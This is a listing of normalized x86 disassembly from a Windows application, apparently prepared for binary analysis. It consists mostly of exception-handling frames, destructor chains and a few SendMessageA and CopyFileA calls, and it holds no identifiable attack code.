call sub_4422d1
lea ecx [ esi + 0x5c ]
call sub_441868
push 0x0
mov ecx esi
call sub_440b18
jmp r-xdata
lea ecx [ esp + 0x120 ]
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x134 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x12c ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x12c
retn
lea ecx [ esp + 0xc ]
mov [ esp + 0x134 ] 0x0
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x134 ] 0x5
call sub_442148
mov [ esp + 0x134 ] 0x4
sub_40f3a0
push 0xffffffff
push sub_45e6f6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40f400
push 0xffffffff
push sub_45e73c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x120
push esi
mov esi ecx
call sub_43e113
push 0x0
lea ecx [ esp + 0xc ]
call sub_41ffa0
mov eax [ rw-data ]
mov [ esp + 0x12c ] 0x0
mov [ esp + 0x4 ] eax
push 0x1
mov ecx esi
mov [ esp + 0x130 ] 0x1
call sub_440b18
push rw-data
lea ecx [ esp + 0x8 ]
call sub_4422d1
mov ecx [ esp + 0x4 ]
push 0x0
push ecx
push 0xffffffff
lea ecx [ esp + 0x14 ]
call sub_42182c
test eax eax
jne r-xdata
mov eax [ esp + 0xd0 ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x4 ]
mov [ esp + 0x12c ] 0x0
call sub_442148
lea ecx [ esp + 0x11c ]
mov [ esp + 0x12c ] 0x3
call sub_442148
lea ecx [ esp + 0x118 ]
mov [ esp + 0x12c ] 0x2
call sub_442148
lea ecx [ esp + 0x8 ]
mov [ esp + 0x12c ] 0xffffffff
call sub_421723
xor eax eax
pop esi
mov ecx [ esp + 0x120 ]
mov [ fs : 0x0 ] ecx
add esp 0x12c
retn
lea ecx [ esp + 0x8 ]
call sub_421900
lea ecx [ esp + 0x4 ]
mov [ esp + 0x12c ] 0x0
call sub_442148
lea ecx [ esp + 0x11c ]
mov [ esp + 0x12c ] 0x5
call sub_442148
lea ecx [ esp + 0x118 ]
mov [ esp + 0x12c ] 0x4
call sub_442148
lea ecx [ esp + 0x8 ]
mov [ esp + 0x12c ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x124 ]
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x12c
retn
push edi
mov edi [ SendMessageA@IAT ]
mov edx [ esp + 0x11c ]
mov eax [ esi + 0xb4 ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0xc ]
push 0x1
push 0x1
lea ecx [ esp + 0x14 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd4 ]
test eax eax
je r-xdata
pop edi
sub_40f5e0
push 0xffffffff
push sub_45e75a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x1d4
call sub_441e89
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je r-xdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_40f660
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40f660
push 0xffffffff
push sub_45e786
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_44f1fe
lea ecx [ esi + 0xbc ]
mov [ esp + 0x10 ] 0x0
call sub_453686
lea ecx [ esi + 0x138 ]
mov [ esp + 0x10 ] 0x1
call sub_453b1c
mov ecx [ esp + 0x8 ]
mov [ esi ] r--data
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40f6e0
push 0xffffffff
push sub_45e7a6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x138 ]
mov [ esp + 0x10 ] 0x1
call sub_453b99
lea ecx [ esi + 0xbc ]
mov [ esp + 0x10 ] 0x0
call sub_4536df
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_44f2dc
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40f750
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi ecx
push eax
call sub_44fb41
cmp eax 0xffffffff
je r-xdata
pop edi
or eax 0xffffffff
pop esi
retn 0x4
lea edi [ esi + 0xbc ]
push 0xe801
push 0x50008200
push esi
mov ecx edi
call sub_45371a
test eax eax
je r-xdata
push 0x4
push rw-data
mov ecx edi
call sub_4537cf
test eax eax
je r-xdata
push 0xf000
mov ecx esi
call sub_45142c
pop edi
xor eax eax
pop esi
retn 0x4
sub_40f800
push 0xffffffff
push sub_45e84b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2b4
push 0x0
lea ecx [ esp + 0x8 ]
call sub_40a690
lea ecx [ esp + 0x4 ]
mov [ esp + 0x2bc ] 0x0
call sub_43de8a
mov [ esp + 0x2bc ] 0x1
lea eax [ esp + 0x198 ]
mov [ esp ] eax
lea ecx [ esp + 0x2b0 ]
mov [ esp + 0x2bc ] 0xc
call sub_442148
lea ecx [ esp + 0x2ac ]
mov [ esp + 0x2bc ] 0xb
call sub_442148
lea ecx [ esp + 0x2a8 ]
mov [ esp + 0x2bc ] 0xa
call sub_442148
lea ecx [ esp + 0x198 ]
mov [ esp + 0x2bc ] 0x9
call sub_421723
lea ecx [ esp + 0x194 ]
mov [ esp + 0x2bc ] 0x8
call sub_442148
lea ecx [ esp + 0x190 ]
mov [ esp + 0x2bc ] 0x7
call sub_442148
lea ecx [ esp + 0x18c ]
mov [ esp + 0x2bc ] 0x6
call sub_442148
lea ecx [ esp + 0x150 ]
mov [ esp + 0x2bc ] 0x5
call sub_44f046
lea ecx [ esp + 0x114 ]
mov [ esp + 0x2bc ] 0x4
call sub_44f046
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x2bc ] 0x3
call sub_44f046
lea ecx [ esp + 0x9c ]
mov [ esp + 0x2bc ] 0x2
call sub_44f046
lea ecx [ esp + 0x60 ]
mov [ esp + 0x2bc ] 0x1
call sub_43c0ee
lea ecx [ esp + 0x4 ]
mov [ esp + 0x2bc ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x2b4 ]
mov [ fs : 0x0 ] ecx
add esp 0x2c0
retn
sub_40f970
push 0xffffffff
push sub_45e922
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2f8
push 0x0
lea ecx [ esp + 0x8 ]
call sub_412360
lea ecx [ esp + 0x4 ]
mov [ esp + 0x300 ] 0x0
call sub_43de8a
mov [ esp + 0x300 ] 0x1
lea eax [ esp + 0x1d8 ]
mov [ esp ] eax
lea ecx [ esp + 0x2f4 ]
mov [ esp + 0x300 ] 0xf
call sub_442148
lea ecx [ esp + 0x2f0 ]
mov [ esp + 0x300 ] 0xe
call sub_442148
lea ecx [ esp + 0x2ec ]
mov [ esp + 0x300 ] 0xd
call sub_442148
lea ecx [ esp + 0x2e8 ]
mov [ esp + 0x300 ] 0xc
call sub_442148
lea ecx [ esp + 0x1d8 ]
mov [ esp + 0x300 ] 0xb
call sub_421723
lea ecx [ esp + 0x1d4 ]
mov [ esp + 0x300 ] 0xa
call sub_442148
lea ecx [ esp + 0x1d0 ]
mov [ esp + 0x300 ] 0x9
call sub_442148
lea ecx [ esp + 0x1cc ]
mov [ esp + 0x300 ] 0x8
call sub_442148
lea ecx [ esp + 0x1c8 ]
mov [ esp + 0x300 ] 0x7
call sub_442148
lea ecx [ esp + 0x18c ]
mov [ esp + 0x300 ] 0x6
call sub_44f046
lea ecx [ esp + 0x150 ]
mov [ esp + 0x300 ] 0x5
call sub_44f046
lea ecx [ esp + 0x114 ]
mov [ esp + 0x300 ] 0x4
call sub_44f046
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x300 ] 0x3
call sub_44f046
lea ecx [ esp + 0x9c ]
mov [ esp + 0x300 ] 0x2
call sub_43c0ee
lea ecx [ esp + 0x60 ]
mov [ esp + 0x300 ] 0x1
call sub_44f0ac
lea ecx [ esp + 0x4 ]
mov [ esp + 0x300 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x2f8 ]
mov [ fs : 0x0 ] ecx
add esp 0x304
retn
sub_40fb20
push 0xffffffff
push sub_45e9f3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esp + 0x18 ] 0x0
lea edi [ esi + 0x1d4 ]
mov [ esp + 0xc ] edi
lea ecx [ edi + 0x11c ]
mov [ esp + 0x18 ] 0xe
call sub_442148
lea ecx [ edi + 0x118 ]
mov [ esp + 0x18 ] 0xd
call sub_442148
lea ecx [ edi + 0x114 ]
mov [ esp + 0x18 ] 0xc
call sub_442148
lea ecx [ edi + 0x110 ]
mov [ esp + 0x18 ] 0xb
call sub_442148
mov ecx edi
mov [ esp + 0x18 ] 0xa
call sub_421723
lea ecx [ esi + 0x1d0 ]
mov [ esp + 0x18 ] 0x9
call sub_442148
lea ecx [ esi + 0x1cc ]
mov [ esp + 0x18 ] 0x8
call sub_442148
lea ecx [ esi + 0x1c8 ]
mov [ esp + 0x18 ] 0x7
call sub_442148
lea ecx [ esi + 0x1c4 ]
mov [ esp + 0x18 ] 0x6
call sub_442148
lea ecx [ esi + 0x188 ]
mov [ esp + 0x18 ] 0x5
call sub_44f046
lea ecx [ esi + 0x14c ]
mov [ esp + 0x18 ] 0x4
call sub_44f046
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x3
call sub_44f046
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x18 ] 0x2
call sub_44f046
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_43c0ee
lea ecx [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_44f0ac
mov ecx esi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_40fc60
push 0xffffffff
push sub_45eb05
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x344
push 0x0
lea ecx [ esp + 0x8 ]
call sub_409230
lea ecx [ esp + 0x4 ]
mov [ esp + 0x34c ] 0x0
call sub_43de8a
mov [ esp + 0x34c ] 0x1
lea eax [ esp + 0x21c ]
mov [ esp ] eax
lea ecx [ esp + 0x340 ]
mov [ esp + 0x34c ] 0x14
call sub_442148
lea ecx [ esp + 0x33c ]
mov [ esp + 0x34c ] 0x13
call sub_442148
lea ecx [ esp + 0x338 ]
mov [ esp + 0x34c ] 0x12
call sub_442148
lea ecx [ esp + 0x334 ]
mov [ esp + 0x34c ] 0x11
call sub_442148
lea ecx [ esp + 0x330 ]
mov [ esp + 0x34c ] 0x10
call sub_442148
lea ecx [ esp + 0x32c ]
mov [ esp + 0x34c ] 0xf
call sub_442148
lea ecx [ esp + 0x21c ]
mov [ esp + 0x34c ] 0xe
call sub_421723
lea ecx [ esp + 0x218 ]
mov [ esp + 0x34c ] 0xd
call sub_442148
lea ecx [ esp + 0x214 ]
mov [ esp + 0x34c ] 0xc
call sub_442148
lea ecx [ esp + 0x210 ]
mov [ esp + 0x34c ] 0xb
call sub_442148
lea ecx [ esp + 0x20c ]
mov [ esp + 0x34c ] 0xa
call sub_442148
lea ecx [ esp + 0x208 ]
mov [ esp + 0x34c ] 0x9
call sub_442148
lea ecx [ esp + 0x204 ]
mov [ esp + 0x34c ] 0x8
call sub_442148
lea ecx [ esp + 0x1c8 ]
mov [ esp + 0x34c ] 0x7
call sub_44f046
lea ecx [ esp + 0x18c ]
mov [ esp + 0x34c ] 0x6
call sub_44f046
lea ecx [ esp + 0x150 ]
mov [ esp + 0x34c ] 0x5
call sub_44f046
lea ecx [ esp + 0x114 ]
mov [ esp + 0x34c ] 0x4
call sub_44f046
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x34c ] 0x3
call sub_44f0ac
lea ecx [ esp + 0x9c ]
mov [ esp + 0x34c ] 0x2
call sub_44f0ac
lea ecx [ esp + 0x60 ]
mov [ esp + 0x34c ] 0x1
call sub_43c0ee
lea ecx [ esp + 0x4 ]
mov [ esp + 0x34c ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x344 ]
mov [ fs : 0x0 ] ecx
add esp 0x350
retn
sub_40fe70
push 0xffffffff
push sub_45eb73
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x370
push 0x0
lea ecx [ esp + 0x4 ]
call sub_418c10
lea ecx [ esp ]
mov [ esp + 0x378 ] 0x0
call sub_43de8a
lea ecx [ esp + 0x158 ]
mov [ esp + 0x378 ] 0x8
call sub_410040
lea ecx [ esp + 0x154 ]
mov [ esp + 0x378 ] 0x7
call sub_442148
lea ecx [ esp + 0x150 ]
mov [ esp + 0x378 ] 0x6
call sub_442148
lea ecx [ esp + 0x14c ]
mov [ esp + 0x378 ] 0x5
call sub_442148
lea ecx [ esp + 0x110 ]
mov [ esp + 0x378 ] 0x4
call sub_44f0ac
lea ecx [ esp + 0xd4 ]
mov [ esp + 0x378 ] 0x3
call sub_44f0ac
lea ecx [ esp + 0x98 ]
mov [ esp + 0x378 ] 0x2
call sub_44f0ac
lea ecx [ esp + 0x5c ]
mov [ esp + 0x378 ] 0x1
call sub_43c0ee
lea ecx [ esp ]
mov [ esp + 0x378 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x370 ]
mov [ fs : 0x0 ] ecx
add esp 0x37c
retn
sub_40ff80
push 0xffffffff
push sub_45ebe7
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x158 ]
mov [ esp + 0x10 ] 0x7
call sub_410040
lea ecx [ esi + 0x154 ]
mov [ esp + 0x10 ] 0x6
call sub_442148
lea ecx [ esi + 0x150 ]
mov [ esp + 0x10 ] 0x5
call sub_442148
lea ecx [ esi + 0x14c ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x3
call sub_44f0ac
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x10 ] 0x2
call sub_44f0ac
lea ecx [ esi + 0x98 ]
mov [ esp + 0x10 ] 0x1
call sub_44f0ac
lea ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] 0x0
call sub_43c0ee
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_410040
push 0xffffffff
push sub_45ef6c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x214 ]
mov [ esp + 0x10 ] 0x3e
call sub_442148
lea ecx [ esi + 0x210 ]
mov [ esp + 0x10 ] 0x3d
call sub_442148
lea ecx [ esi + 0x20c ]
mov [ esp + 0x10 ] 0x3c
call sub_442148
lea ecx [ esi + 0x208 ]
mov [ esp + 0x10 ] 0x3b
call sub_442148
lea ecx [ esi + 0x204 ]
mov [ esp + 0x10 ] 0x3a
call sub_442148
lea ecx [ esi + 0x200 ]
mov [ esp + 0x10 ] 0x39
call sub_442148
lea ecx [ esi + 0x1fc ]
mov [ esp + 0x10 ] 0x38
call sub_442148
lea ecx [ esi + 0x1f8 ]
mov [ esp + 0x10 ] 0x37
call sub_442148
lea ecx [ esi + 0x1f4 ]
mov [ esp + 0x10 ] 0x36
call sub_442148
lea ecx [ esi + 0x1f0 ]
mov [ esp + 0x10 ] 0x35
call sub_442148
lea ecx [ esi + 0x1ec ]
mov [ esp + 0x10 ] 0x34
call sub_442148
lea ecx [ esi + 0x1e8 ]
mov [ esp + 0x10 ] 0x33
call sub_442148
lea ecx [ esi + 0x1e4 ]
mov [ esp + 0x10 ] 0x32
call sub_442148
lea ecx [ esi + 0x1e0 ]
mov [ esp + 0x10 ] 0x31
call sub_442148
lea ecx [ esi + 0x1dc ]
mov [ esp + 0x10 ] 0x30
call sub_442148
lea ecx [ esi + 0x1d8 ]
mov [ esp + 0x10 ] 0x2f
call sub_442148
lea ecx [ esi + 0x1d4 ]
mov [ esp + 0x10 ] 0x2e
call sub_442148
lea ecx [ esi + 0x1d0 ]
mov [ esp + 0x10 ] 0x2d
call sub_442148
lea ecx [ esi + 0x1cc ]
mov [ esp + 0x10 ] 0x2c
call sub_442148
lea ecx [ esi + 0x1c8 ]
mov [ esp + 0x10 ] 0x2b
call sub_442148
lea ecx [ esi + 0x1c4 ]
mov [ esp + 0x10 ] 0x2a
call sub_442148
lea ecx [ esi + 0x1c0 ]
mov [ esp + 0x10 ] 0x29
call sub_442148
lea ecx [ esi + 0x1bc ]
mov [ esp + 0x10 ] 0x28
call sub_442148
lea ecx [ esi + 0x1b8 ]
mov [ esp + 0x10 ] 0x27
call sub_442148
lea ecx [ esi + 0x1b4 ]
mov [ esp + 0x10 ] 0x26
call sub_442148
lea ecx [ esi + 0x1b0 ]
mov [ esp + 0x10 ] 0x25
call sub_442148
lea ecx [ esi + 0x1ac ]
mov [ esp + 0x10 ] 0x24
call sub_442148
lea ecx [ esi + 0x1a8 ]
mov [ esp + 0x10 ] 0x23
call sub_442148
lea ecx [ esi + 0x1a4 ]
mov [ esp + 0x10 ] 0x22
call sub_442148
lea ecx [ esi + 0x1a0 ]
mov [ esp + 0x10 ] 0x21
call sub_442148
lea ecx [ esi + 0x19c ]
mov [ esp + 0x10 ] 0x20
call sub_442148
lea ecx [ esi + 0x198 ]
mov [ esp + 0x10 ] 0x1f
call sub_442148
lea ecx [ esi + 0x194 ]
mov [ esp + 0x10 ] 0x1e
call sub_442148
lea ecx [ esi + 0x190 ]
mov [ esp + 0x10 ] 0x1d
call sub_442148
lea ecx [ esi + 0x18c ]
mov [ esp + 0x10 ] 0x1c
call sub_442148
lea ecx [ esi + 0x188 ]
mov [ esp + 0x10 ] 0x1b
call sub_442148
lea ecx [ esi + 0x184 ]
mov [ esp + 0x10 ] 0x1a
call sub_442148
lea ecx [ esi + 0x180 ]
mov [ esp + 0x10 ] 0x19
call sub_442148
lea ecx [ esi + 0x17c ]
mov [ esp + 0x10 ] 0x18
call sub_442148
lea ecx [ esi + 0x178 ]
mov [ esp + 0x10 ] 0x17
call sub_442148
lea ecx [ esi + 0x174 ]
mov [ esp + 0x10 ] 0x16
call sub_442148
lea ecx [ esi + 0x170 ]
mov [ esp + 0x10 ] 0x15
call sub_442148
lea ecx [ esi + 0x16c ]
mov [ esp + 0x10 ] 0x14
call sub_442148
lea ecx [ esi + 0x168 ]
mov [ esp + 0x10 ] 0x13
call sub_442148
lea ecx [ esi + 0x164 ]
mov [ esp + 0x10 ] 0x12
call sub_442148
lea ecx [ esi + 0x160 ]
mov [ esp + 0x10 ] 0x11
call sub_442148
lea ecx [ esi + 0x15c ]
mov [ esp + 0x10 ] 0x10
call sub_442148
lea ecx [ esi + 0x158 ]
mov [ esp + 0x10 ] 0xf
call sub_442148
lea ecx [ esi + 0x154 ]
mov [ esp + 0x10 ] 0xe
call sub_442148
lea ecx [ esi + 0x150 ]
mov [ esp + 0x10 ] 0xd
call sub_442148
lea ecx [ esi + 0x14c ]
mov [ esp + 0x10 ] 0xc
call sub_442148
lea ecx [ esi + 0x148 ]
mov [ esp + 0x10 ] 0xb
call sub_442148
lea ecx [ esi + 0x140 ]
mov [ esp + 0x10 ] 0xa
call sub_442148
lea ecx [ esi + 0x134 ]
mov [ esp + 0x10 ] 0x9
call sub_442148
lea ecx [ esi + 0x130 ]
mov [ esp + 0x10 ] 0x8
call sub_442148
lea ecx [ esi + 0x12c ]
mov [ esp + 0x10 ] 0x7
call sub_442148
lea ecx [ esi + 0x128 ]
mov [ esp + 0x10 ] 0x6
call sub_442148
lea ecx [ esi + 0x124 ]
mov [ esp + 0x10 ] 0x5
call sub_442148
lea ecx [ esi + 0x120 ]
mov [ esp + 0x10 ] 0x4
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x10 ] 0x3
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x10 ] 0x2
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x10 ] 0x1
call sub_442148
lea ecx [ esi + 0x110 ]
mov [ esp + 0x10 ] 0x0
call sub_442148
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_410470
push 0xffffffff
push sub_45effb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1d0
push 0x0
lea ecx [ esp + 0x8 ]
call sub_4132a0
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1d8 ] 0x0
call sub_43de8a
mov [ esp + 0x1d8 ] 0x1
lea eax [ esp + 0xa4 ]
mov [ esp ] eax
lea ecx [ esp + 0x1c8 ]
mov [ esp + 0x1d8 ] 0x8
call sub_442148
lea ecx [ esp + 0x1c4 ]
mov [ esp + 0x1d8 ] 0x7
call sub_442148
lea ecx [ esp + 0x1c0 ]
mov [ esp + 0x1d8 ] 0x6
call sub_442148
lea ecx [ esp + 0x1bc ]
mov [ esp + 0x1d8 ] 0x5
call sub_442148
lea ecx [ esp + 0x1b8 ]
mov [ esp + 0x1d8 ] 0x4
call sub_442148
lea ecx [ esp + 0xa4 ]
mov [ esp + 0x1d8 ] 0x3
call sub_421723
lea ecx [ esp + 0xa0 ]
mov [ esp + 0x1d8 ] 0x2
call sub_442148
lea ecx [ esp + 0x60 ]
mov [ esp + 0x1d8 ] 0x1
call sub_43c0ee
lea ecx [ esp + 0x4 ]
mov [ esp + 0x1d8 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x1d0 ]
mov [ fs : 0x0 ] ecx
add esp 0x1dc
retn
sub_410590
push 0xffffffff
push sub_45f071
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
mov edi ecx
mov [ esp + 0x8 ] edi
mov [ esp + 0x18 ] 0x0
lea esi [ edi + 0xa0 ]
mov [ esp + 0xc ] esi
lea ecx [ esi + 0x124 ]
mov [ esp + 0x18 ] 0x7
call sub_442148
lea ecx [ esi + 0x120 ]
mov [ esp + 0x18 ] 0x6
call sub_442148
lea ecx [ esi + 0x11c ]
mov [ esp + 0x18 ] 0x5
call sub_442148
lea ecx [ esi + 0x118 ]
mov [ esp + 0x18 ] 0x4
call sub_442148
lea ecx [ esi + 0x114 ]
mov [ esp + 0x18 ] 0x3
call sub_442148
mov ecx esi
mov [ esp + 0x18 ] 0x2
call sub_421723
lea ecx [ edi + 0x9c ]
mov [ esp + 0x18 ] 0x1
call sub_442148
lea ecx [ edi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_43c0ee
mov ecx edi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_410670
push 0x0
push 0x1
push rw-data
call sub_4496b7
cmp eax 0x2
je r-xdata
retn
push 0x0
push rw-data
push rw-data
call [ CopyFileA@IAT ]
test eax eax
push 0x0
push 0x0
je r-xdata
push rw-data
call sub_4496b7
push rw-data
call sub_4496b7
retn
sub_4106c0
push 0x0
push 0x1
push rw-data
call sub_4496b7
cmp eax 0x2
je r-xdata
retn
push 0x0
push rw-data
push rw-data
call [ CopyFileA@IAT ]
test eax eax
push 0x0
push 0x0
je r-xdata
push rw-data
call sub_4496b7
push rw-data
call sub_4496b7
retn
sub_410710
push 0xffffffff
push sub_45f16a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2d4
push 0x0
lea ecx [ esp + 0x8 ]
call sub_415f90
lea ecx [ esp + 0x4 ]
mov [ esp + 0x2dc ] 0x0
call sub_43de8a
mov [ esp + 0x2dc ] 0x1
lea eax [ esp + 0x19c ]
mov [ esp ] eax
lea ecx [ esp + 0x2d0 ]
mov [ esp + 0x2dc ] 0x11
call sub_442148
lea ecx [ esp + 0x2c4 ]
mov [ esp + 0x2dc ] 0x10
call sub_442148
lea ecx [ esp + 0x2c0 ]
mov [ esp + 0x2dc ] 0xf
call sub_442148
lea ecx [ esp + 0x2bc ]
mov [ esp + 0x2dc ] 0xe
call sub_442148
lea ecx [ esp + 0x2b8 ]
mov [ esp + 0x2dc ] 0xd
call sub_442148
lea ecx [ esp + 0x2b4 ]
mov [ esp + 0x2dc ] 0xc
call sub_442148
lea ecx [ esp + 0x2b0 ]
mov [ esp + 0x2dc ] 0xb
call sub_442148
lea ecx [ esp + 0x19c ]
mov [ esp + 0x2dc ] 0xa
call sub_421723
lea ecx [ esp + 0x198 ]
mov [ esp + 0x2dc ] 0x9
call sub_442148
lea ecx [ esp + 0x194 ]
mov [ esp + 0x2dc ] 0x8
call sub_442148
lea ecx [ esp + 0x190 ]
mov [ esp + 0x2dc ] 0x7
call sub_442148
lea ecx [ esp + 0x18c ]
mov [ esp + 0x2dc ] 0x6
call sub_442148
lea ecx [ esp + 0x150 ]
mov [ esp + 0x2dc ] 0x5
call sub_43c0ee
lea ecx [ esp + 0x114 ]
mov [ esp + 0x2dc ] 0x4
call sub_44f0ac
lea ecx [ esp + 0xd8 ]
mov [ esp + 0x2dc ] 0x3
call sub_44f0ac
lea ecx [ esp + 0x9c ]
mov [ esp + 0x2dc ] 0x2
call sub_44f0ac
lea ecx [ esp + 0x60 ]
mov [ esp + 0x2dc ] 0x1
call sub_44f0ac
lea ecx [ esp + 0x4 ]
mov [ esp + 0x2dc ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x2d4 ]
mov [ fs : 0x0 ] ecx
add esp 0x2e0
retn
sub_4108e0
push 0xffffffff
push sub_45f25f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esp + 0x18 ] 0x0
lea edi [ esi + 0x198 ]
mov [ esp + 0xc ] edi
lea ecx [ edi + 0x134 ]
mov [ esp + 0x18 ] 0x10
call sub_442148
lea ecx [ edi + 0x128 ]
mov [ esp + 0x18 ] 0xf
call sub_442148
lea ecx [ edi + 0x124 ]
mov [ esp + 0x18 ] 0xe
call sub_442148
lea ecx [ edi + 0x120 ]
mov [ esp + 0x18 ] 0xd
call sub_442148
lea ecx [ edi + 0x11c ]
mov [ esp + 0x18 ] 0xc
call sub_442148
lea ecx [ edi + 0x118 ]
mov [ esp + 0x18 ] 0xb
call sub_442148
lea ecx [ edi + 0x114 ]
mov [ esp + 0x18 ] 0xa
call sub_442148
mov ecx edi
mov [ esp + 0x18 ] 0x9
call sub_421723
lea ecx [ esi + 0x194 ]
mov [ esp + 0x18 ] 0x8
call sub_442148
lea ecx [ esi + 0x190 ]
mov [ esp + 0x18 ] 0x7
call sub_442148
lea ecx [ esi + 0x18c ]
mov [ esp + 0x18 ] 0x6
call sub_442148
lea ecx [ esi + 0x188 ]
mov [ esp + 0x18 ] 0x5
call sub_442148
lea ecx [ esi + 0x14c ]
mov [ esp + 0x18 ] 0x4
call sub_43c0ee
lea ecx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x3
call sub_44f0ac
lea ecx [ esi + 0xd4 ]
mov [ esp + 0x18 ] 0x2
call sub_44f0ac
lea ecx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
call sub_44f0ac
lea ecx [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x0
call sub_44f0ac
mov ecx esi
mov [ esp + 0x18 ] 0xffffffff
call sub_43da87
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_410a40
push 0xffffffff
push sub_45f339
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x46c
push 0x0
lea ecx [ esp + 0x8 ]
call sub_416ea0
lea ecx [ esp + 0x4 ]
mov [ esp + 0x474 ] 0x0
call sub_43de8a
mov [ esp + 0x474 ] 0x1
lea eax [ esp + 0x334 ]
mov [ esp ] eax
lea ecx [ esp + 0x468 ]
mov [ esp + 0x474 ] 0xe
call sub_442148
lea ecx [ esp + 0x45c ]
mov [ esp + 0x474 ] 0xd
call sub_442148
lea ecx [ esp + 0x458 ]
mov [ esp + 0x474 ] 0xc
call sub_442148
lea ecx [ esp + 0x454 ]
mov [ esp + 0x474 ] 0xb
call sub_442148
lea ecx [ esp + 0x450 ]
mov [ esp + 0x474 ] 0xa
call sub_442148
lea ecx [ esp + 0x44c ]
mov [ esp + 0x474 ] 0x9
call sub_442148
